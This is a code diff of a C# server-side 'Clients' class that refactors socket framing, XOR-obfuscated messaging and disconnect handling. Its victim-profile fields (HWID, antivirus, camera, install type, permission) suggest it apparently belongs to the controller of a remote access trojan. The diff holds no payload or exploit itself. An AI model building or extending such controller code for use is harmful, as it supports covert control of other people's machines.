@@ -1,169 +1,194 @@
-﻿using Microsoft.VisualBasic;
+﻿using MessagePack;
+using Microsoft.VisualBasic;
 using System;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Server
 {
-    class Clients
+    public class Clients
     {
-        public Socket Client { get; set; }
-        private byte[] Buffer { get; set; }
-        private long Buffersize { get; set; }
-        private bool BufferRecevied { get; set; }
-        private MemoryStream MS { get; set; }
-        private event ReadEventHandler Read;
-        private delegate void ReadEventHandler(Clients client, byte[] data);
-        private object SendSync { get; set; }
-        public bool IsControler { get; set; }
+        public Socket ClientSocket { get; set; }
+        public string ID { get; set; }
+        private byte[] ClientBuffer { get; set; }
+        private int ClientBuffersize { get; set; }
+        private bool ClientBufferRecevied { get; set; }
+        private MemoryStream ClientMS { get; set; }
+        public object SendSync { get; } = new object();
+        private object EndSendSync { get; } = new object();
+        public long BytesRecevied { get; set; }
         public ClientInfo Info { get; set; }
 
         public class ClientInfo
         {
-            public string HWID { get; set; }
+            public string HWID;
             public string IP;
             public string User;
             public string OS;
             public bool Camera;
-            public int InstallType;
+            public long InstallType;
             public string InstallTime;
             public string Path;
+            public string Active;
             public string Version;
-            public int Permission;
+            public long Permission;
             public string AV;
             public string Group;
+            public DateTime LastPing;
         }
 
-        public Clients(Socket CLIENT)
+        public Clients(Socket socket)
         {
-            Client = CLIENT;
-            Buffer = new byte[1];
-            Buffersize = 0;
-            BufferRecevied = false;
-            IsControler = false;
-            MS = new MemoryStream();
-            Read += HandlePacket.Read;
-            SendSync = new object();
+            ClientSocket = socket;
+            ClientBuffer = new byte[4];
+            ClientMS = new MemoryStream();
             Info = new ClientInfo();
-            Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
+            Info.IP = ClientSocket.RemoteEndPoint.ToString().Split(':')[0];
+            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
         }
 
         public async void ReadClientData(IAsyncResult ar)
         {
             try
             {
-                if (!Client.Connected)
+                if (!ClientSocket.Connected)
                 {
                     Disconnected();
+                    return;
                 }
                 else
                 {
-                    int Recevied = Client.EndReceive(ar);
+                    int Recevied = ClientSocket.EndReceive(ar);
                     if (Recevied > 0)
                     {
-                        if (BufferRecevied == false)
+                        if (!ClientBufferRecevied)
                         {
-                            if (Buffer[0] == 0)
+                            await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
+                            ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
+                            ClientMS.Dispose();
+                            ClientMS = new MemoryStream();
+                            if (ClientBuffersize > 0)
                             {
-                                Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
-                                MS.Dispose();
-                                MS = new MemoryStream();
-                                if (Buffersize > 0)
-                                {
-                                    Buffer = new byte[Buffersize - 1];
-                                    BufferRecevied = true;
-                                }
-                            }
-                            else
-                            {
-                                await MS.WriteAsync(Buffer, 0, Buffer.Length);
+                                ClientBuffer = new byte[ClientBuffersize];
+                                ClientBufferRecevied = true;
                             }
                         }
                         else
                         {
-                            await MS.WriteAsync(Buffer, 0, Recevied);
-                            if (MS.Length == Buffersize)
+                            await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
+                            Settings.Received += Recevied;
+                            BytesRecevied += Recevied;
+                            if (ClientMS.Length == ClientBuffersize)
                             {
-                                Task task = Task.Run(() => Read.Invoke(this, MS.ToArray()));
-                                task.Wait();
-                                Settings.Received += MS.ToArray().Length;
-                                Buffer = new byte[1];
-                                Buffersize = 0;
-                                MS.Dispose();
-                                MS = new MemoryStream();
-                                BufferRecevied = false;
+                                ThreadPool.QueueUserWorkItem(new HandlePacket
+                                {
+                                    client = this,
+                                    data = ClientMS.ToArray(),
+                                }.Read, null);
+                                ClientBuffer = new byte[4];
+                                ClientMS.Dispose();
+                                ClientMS = new MemoryStream();
+                                ClientBufferRecevied = false;
                             }
                             else
-                            {
-                                Buffer = new byte[Buffersize - MS.Length];
-                            }
+                                ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                         }
-                        Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
+                        ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
                     }
                     else
                     {
                         Disconnected();
+                        return;
                     }
                 }
             }
             catch
             {
                 Disconnected();
+                return;
             }
         }
 
         public void Disconnected()
         {
-            Settings.Online.Remove(this);
             try
             {
-                MS?.Dispose();
-                Client?.Close();
-                Client?.Dispose();
+                lock (Settings.Online)
+                    Settings.Online.Remove(this);
+            }
+            catch { }
+
+            try
+            {
+                if (ClientSocket.Connected)
+                {
+                    ClientSocket.Shutdown(SocketShutdown.Both);
+                }
+            }
+            catch { }
+
+            try
+            {
+                ClientSocket?.Dispose();
+                ClientMS?.Dispose();
             }
             catch { }
         }
 
-        public void BeginSend(object Msgs)
+        public void BeginSend(object msg)
         {
             lock (SendSync)
             {
-                if (Client.Connected)
+                try
                 {
-                    try
-                    {
-                        using (MemoryStream MS = new MemoryStream())
-                        {
-                            byte[] buffer = Helper.Xor((byte[])Msgs);
-                            byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
-                            MS.WriteAsync(buffersize, 0, buffersize.Length);
-                            MS.WriteAsync(buffer, 0, buffer.Length);
-                            Client.Poll(-1, SelectMode.SelectWrite);
-                            Client.BeginSend(MS.ToArray(), 0, (int)MS.Length, SocketFlags.None, EndSend, null);
-                            Settings.Sent += (long)MS.Length;
-                        }
-                    }
-                    catch
+                    if (!ClientSocket.Connected)
                     {
                         Disconnected();
+                        return;
                     }
+
+                    if ((byte[])msg == null) return;
+
+                    byte[] buffer = Helper.Xor((byte[])msg);
+                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
+
+                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
+                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
+                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                 }
+                catch
+                {
+                    Disconnected();
+                    return;
+                }
+
             }
         }
 
-        
-
-        public void EndSend(IAsyncResult ar)
+        private void EndSend(IAsyncResult ar)
         {
-            try
+            lock (EndSendSync)
             {
-                Client.EndSend(ar);
-            }
-            catch
-            {
-                Disconnected();
+                try
+                {
+                    if (!ClientSocket.Connected)
+                    {
+                        Disconnected();
+                        return;
+                    }
+
+                    int sent = 0;
+                    sent = ClientSocket.EndSend(ar);
+                    Settings.Sent += sent;
+                }
+                catch
+                {
+                    Disconnected();
+                    return;
+                }
             }
         }
     }
